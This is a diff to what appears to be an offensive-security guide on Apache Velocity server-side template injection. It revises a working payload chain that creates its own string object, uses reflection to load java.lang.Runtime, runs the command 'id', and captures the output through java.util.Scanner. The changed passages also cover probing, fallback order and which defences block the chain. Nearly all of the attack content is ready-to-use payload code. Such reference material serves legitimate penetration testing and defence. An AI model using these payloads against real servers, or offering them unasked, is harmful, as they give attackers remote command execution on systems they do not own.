@@ -21,24 +21,25 @@ The standard chain obtains a `Class` object, walks to its classloader or directl
 $i
 ```
 
-Without a tool reference, the chain starts from any object's `getClass()` and uses `forName` to load `Runtime`:
+Without a tool reference, bootstrap the chain from a string you define yourself with `#set`, take its `.class`, and use `forName` to load `Runtime`:
 
 ```velocity
-#set($str = $stringLiteral.class.forName("java.lang.Runtime"))
+#set($s = "")
+#set($str = $s.class.forName("java.lang.Runtime"))
 #set($rt = $str.getMethod("getRuntime",null).invoke(null,null))
 $rt.exec("id")
 ```
 
-To read the command output (rather than a bare `Process` object), wire the process `InputStream` through a scanner:
+Defining `$s` with `#set($s = "")` guarantees a real object is in scope, instead of relying on a context reference that may not exist. To read the command output (rather than a bare `Process` object), wire the process `InputStream` through a scanner, reusing `$s.class`:
 
 ```velocity
 #set($proc = $rt.exec("id"))
 #set($is = $proc.getInputStream())
-#set($scan = $stringLiteral.class.forName("java.util.Scanner").getConstructor($stringLiteral.class.forName("java.io.InputStream")).newInstance($is).useDelimiter("\A"))
+#set($scan = $s.class.forName("java.util.Scanner").getConstructor($s.class.forName("java.io.InputStream")).newInstance($is).useDelimiter("\A"))
 $scan.next()
 ```
 
-Exploitability depends on what the context exposes. Stock Velocity with no tools and a restricted context can still reach `getClass()` on any string literal, which is enough to bootstrap the reflection chain; the practical blocker is a `SecurityManager` or a context that exposes no object references at all. Confirm with the `#set` math probe, then try the `ClassTool` form first and fall back to the pure-reflection chain.
+Exploitability depends less on the context than with other engines, because `#set($s = "")` lets the template create its own object and reach `.class` on it; the practical blocker is a `SecurityManager` restricting reflection, or an event-handler/uberspect configuration that blocks method introspection. Confirm with the `#set` math probe, then try the `ClassTool` form first and fall back to the self-bootstrapped reflection chain.
 
 ## Tools
 
